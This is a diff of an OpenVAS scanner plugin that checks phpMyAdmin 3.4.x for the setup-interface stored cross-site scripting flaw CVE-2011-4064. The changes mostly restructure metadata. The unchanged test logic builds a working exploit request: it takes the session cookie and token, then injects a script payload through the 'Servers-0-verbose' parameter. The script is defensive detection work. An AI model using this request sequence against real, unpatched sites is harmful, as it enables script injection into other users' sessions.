@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_phpmyadmin_setup_interface_xss_vuln.nasl 7161 2017-09-18 07:43:57Z cfischer $
+# $Id: secpod_phpmyadmin_setup_interface_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # phpMyAdmin Setup Interface Cross Site Scripting Vulnerability
 #
@@ -24,31 +24,17 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
-  and script code, which will be executed in a user's browser session in the
-  context of an affected site.
-  Impact Level: Application";
-tag_affected = "phpMyAdmin versions 3.4.x before 3.4.6";
-tag_insight = "The flaw is due to improper validation of user-supplied input
-  via the 'Servers-0-verbose' parameter to setup/index.php, which allows
-  attackers to execute arbitrary HTML and script code in a user's browser
-  session in the context of an affected site.";
-tag_solution = "Upgrade to phpMyAdmin version 3.4.6 or later,
-  For updates refer to http://www.phpmyadmin.net/home_page/downloads.php";
-tag_summary = "The host is running phpMyAdmin and is prone to cross-site scripting
-  vulnerability.";
-
 CPE = "cpe:/a:phpmyadmin:phpmyadmin";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902585");
-  script_version("$Revision: 7161 $");
+  script_version("$Revision: 11997 $");
   script_cve_id("CVE-2011-4064");
   script_bugtraq_id(50175);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-18 09:43:57 +0200 (Mon, 18 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-11-22 17:17:17 +0530 (Tue, 22 Nov 2011)");
   script_name("phpMyAdmin Setup Interface Cross Site Scripting Vulnerability");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -58,16 +44,24 @@ if(description)
   script_dependencies("secpod_phpmyadmin_detect_900129.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("phpMyAdmin/installed");
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/46431");
-  script_xref(name : "URL" , value : "http://securitytracker.com/id/1026199");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/70681");
-  script_xref(name : "URL" , value : "http://www.phpmyadmin.net/home_page/security/PMASA-2011-16.php");
-  script_xref(name : "URL" , value : "http://hauntit.blogspot.com/2011/09/stored-xss-in-phpmyadmin-345-all.html");
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
+  and script code, which will be executed in a user's browser session in the
+  context of an affected site.");
+  script_tag(name:"affected", value:"phpMyAdmin versions 3.4.x before 3.4.6");
+  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
+  via the 'Servers-0-verbose' parameter to setup/index.php, which allows
+  attackers to execute arbitrary HTML and script code in a user's browser
+  session in the context of an affected site.");
+  script_tag(name:"solution", value:"Upgrade to phpMyAdmin version 3.4.6 or later.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"The host is running phpMyAdmin and is prone to cross-site scripting
+  vulnerability.");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/46431");
+  script_xref(name:"URL", value:"http://securitytracker.com/id/1026199");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/70681");
+  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-16.php");
+  script_xref(name:"URL", value:"http://hauntit.blogspot.com/2011/09/stored-xss-in-phpmyadmin-345-all.html");
+  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/downloads.php");
   exit(0);
 }
 
@@ -80,27 +74,23 @@ if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
 host = http_host_name( port:port );
 
-## Send and Receive the response
 url = "/setup/index.php?tab_hash=&check_page_refresh=1&page=servers&mode=" +
       "add&submit=New+server";
 req = http_get(item:dir+url,  port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Get Session ID
 cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
 if(isnull(cookie[1])) {
   exit(0);
 }
 cookie = cookie[1];
 
-## Get Token
 token = eregmatch(pattern:'name="token" value="([a-zA-Z0-9]+)"', string:res);
 if(isnull(token[1])) {
   exit(0);
 }
 token = token[1];
 
-## Construct attack request
 data = string("tab_hash=&check_page_refresh=1&token=", token, "&Servers-0-",
               "verbose=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
               "&Servers-0-host=localhost&Servers-0-port=&Servers-0-socket=&S",
@@ -138,15 +128,12 @@ req = string("POST ", url, " HTTP/1.1\r\n",
 ## Send crafted POST request and receive the response
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Confirm exploit
 if(res =~ "HTTP/1.. 30")
 {
-  ## Send request and receive the response
   req = http_get(item:string(dir,"/setup/index.php"), port:port);
   req = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');
   res = http_keepalive_send_recv(port:port, data:req);
 
-  ## Confirm exploit worked by checking the response
   if(res =~ "HTTP/1\.. 200" && "Use SSL (<script>alert(document.cookie)</script>)" >< res){
     security_message(port);
   }
